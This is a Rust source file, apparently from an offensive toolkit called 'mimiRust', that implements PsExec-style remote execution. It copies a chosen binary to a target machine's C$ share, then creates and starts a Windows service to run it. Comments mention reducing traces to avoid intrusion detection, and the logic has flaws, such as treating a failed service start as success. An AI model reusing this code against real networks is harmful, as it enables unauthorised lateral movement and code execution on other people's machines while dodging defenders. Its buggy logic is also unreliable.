use std::io::Error;
use std::ptr::null;
use std::fs;

use std::ffi::CString;

use winapi::um::winsvc::{
    OpenSCManagerA,
    SC_MANAGER_CREATE_SERVICE,
    SC_HANDLE__,
    CreateServiceA,
    SERVICE_ALL_ACCESS,
    StartServiceA,
    OpenServiceA,
    DeleteService,
    CloseServiceHandle,
    //StartServiceCtrlDispatcherW,
    //SERVICE_TABLE_ENTRYW,
};

use winapi::um::winnt::{
    SERVICE_WIN32_OWN_PROCESS,
    SERVICE_DEMAND_START,
    SERVICE_ERROR_NORMAL,
};

#[derive(Debug, Clone)]
pub struct PSExec {
    pub computer_name: String,
    pub binary_path: String,
    pub service_name: String,
    pub display_name: String
}

impl PSExec {
    pub fn new(input_computer_name: String, input_binary_path: String, input_service_name: Option<String>, input_display_name: Option<String>) -> Self {
        if let Some(input_service_name) = input_service_name {
            if let Some(input_display_name) = input_display_name {
                return Self {
                    computer_name: input_computer_name,
                    binary_path: input_binary_path,
                    service_name: input_service_name,
                    display_name: input_display_name,
                }
            }
            return Self {
                computer_name: input_computer_name,
                binary_path: input_binary_path,
                service_name: input_service_name,
                display_name: "mimiRust Service".to_string(),
            }
        }
        Self {
            computer_name: input_computer_name,
            binary_path: input_binary_path,
            service_name: "mimiRust".to_string(),
            display_name: "mimiRust Service".to_string(),
        }
    }

    pub fn execute(config: Self) -> bool {
        let handle_service_manager = open_service_manager(config.computer_name.clone());
        let handle_service = get_service_handle(handle_service_manager, config.service_name.clone());
        if handle_service != 0 as *mut SC_HANDLE__ {
            //Delete service before we begin making a new one.
            if delete_service(handle_service) {
                println!("[*] Deleted service, as you were trying to create a service that was already on: {}\n", config.computer_name.clone());
                close_handle(handle_service);
            } else {
                println!("[!] Unable to delete: {} from: {} because: {}", config.service_name.clone(), config.computer_name.clone(), Error::last_os_error());
            }
        }

        //The service does not start onto the remote host as of yet.
        //Once it does start, I can also try to perhaps run it from the DC location to prevent writing the payload a bunch of times.
        //Which inturn helps with IDS (Intrusion Detection Systems)

        let get_dst_filename = get_exe_name(config.binary_path.clone());
        let dst_location = format!("\\\\{}\\C$\\{}", config.computer_name.clone(), get_dst_filename);
        match fs::copy(config.binary_path.clone(), dst_location.clone()) {
            Ok(_) => {
                println!("[*] Copied: {} to: {}", config.binary_path.clone(), config.computer_name.clone());
                let (result, handle) = create_service(handle_service_manager, config.service_name.clone(), config.display_name.clone(), dst_location.clone());
                if result {
                    println!("[+] Created service at: {} with name: {} and binary path: {} on handle: {:?}", config.computer_name.clone(), config.service_name.clone(), dst_location.clone(), handle);

                    //Does not start the service on the remote host!
                    if start_service(config.computer_name.clone(), config.service_name.clone()) {
                        println!("[+] Started service!");
                    } else {
                        println!("[-] Failed to start service: {}", Error::last_os_error());
                        close_handle(handle);
                        close_handle(handle_service);
                    }
                } else {
                    println!("[*] Failed to create service on endpoint with error: {}", Error::last_os_error());
                    close_handle(handle_service);
                }
            },
            Err(e) => {
                println!("[*] Failed to copy file to remote host! with error: {}", e);
                return false;
            },
        };
        return false;
    }
}

fn open_service_manager(computer_name: String) -> *mut SC_HANDLE__ {
    unsafe {
        let cstring = CString::new(computer_name).unwrap();
        let handle: *mut SC_HANDLE__ = OpenSCManagerA(cstring.as_ptr(), null(), SC_MANAGER_CREATE_SERVICE);
        if handle == 0 as *mut SC_HANDLE__ {
            println!("[!] Failed to open service manager with error: {:?}", Error::last_os_error());
            std::process::exit(0x100);
        }
        return handle;
    }
}

//Inspired by https://github.com/mullvad/windows-service-rs Kappa
//For a service to receive a START, STOP, PAUSE signal it requires a service dispatcher.
//Service dispatcher has not yet worked in my implementation.

// fn open_service_dispatcher(
//     service_name: String, 
//     service_main: extern "system" fn(u32, *mut *mut u16),
// ) -> bool {
//     unsafe {
//         let service_table: &[SERVICE_TABLE_ENTRYW] = &[
//             SERVICE_TABLE_ENTRYW {
//                 lpServiceName: service_name.as_ptr() as *const u16,
//                 lpServiceProc: Some(service_main),
//             },
//             SERVICE_TABLE_ENTRYW {
//                 lpServiceName: std::ptr::null(),
//                 lpServiceProc: None,
//             },
//         ];

//         let dispatcher = StartServiceCtrlDispatcherW(service_table.as_ptr() as *const SERVICE_TABLE_ENTRYW);
//         if dispatcher != 0 {
//             return true;
//         }
//         return false;
//     }
// }

fn create_service(service_manager_handle: *mut SC_HANDLE__, service_name: String, display_name: String, binary_path: String) -> (bool, *mut SC_HANDLE__) {
    unsafe {

        let cstring_service_name = CString::new(service_name).unwrap();
        let cstring_display_name = CString::new(display_name).unwrap();
        let cstring_binary_path = CString::new(binary_path).unwrap();

        let handle = CreateServiceA(
            service_manager_handle,
            cstring_service_name.as_ptr(),
            cstring_display_name.as_ptr(),
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            cstring_binary_path.as_ptr(),
            null(),
            0 as *mut u32,
            null(),
            null(),
            null(),
        );

        if handle == 0 as *mut SC_HANDLE__ {
            return (false, handle);
        }

        return (true, handle);
    }
}

fn start_service(computer_name: String, service_name: String) -> bool {
    unsafe {
        let handle_service = get_service_handle(open_service_manager(computer_name.clone()), service_name.clone());
        let result = StartServiceA(handle_service, 0, 0 as *mut *const i8);
        if result == 0 {
            return true;
        }
    }
    return false;
}

fn get_service_handle(service_manager_handle: *mut SC_HANDLE__, service_name: String) -> *mut SC_HANDLE__ {
    let cstring_service_name = CString::new(service_name).unwrap();
    unsafe {return OpenServiceA(service_manager_handle, cstring_service_name.as_ptr(), 0x10000);}
}

fn delete_service(service_manager_handle: *mut SC_HANDLE__) -> bool {
    unsafe {
        if DeleteService(
            service_manager_handle
        ) != 0 {
            return true;
        }
    }
    return false;
}

fn close_handle(handle_to_close: *mut SC_HANDLE__) -> bool {
    unsafe {
        if CloseServiceHandle(handle_to_close) == 1 {
            return true;
        }
        return false;
    }
}

fn get_exe_name(location: String) -> String {
    let splitter: Vec<&str> = location.split("\\").collect();
    return splitter[splitter.len() - 1].to_string();
}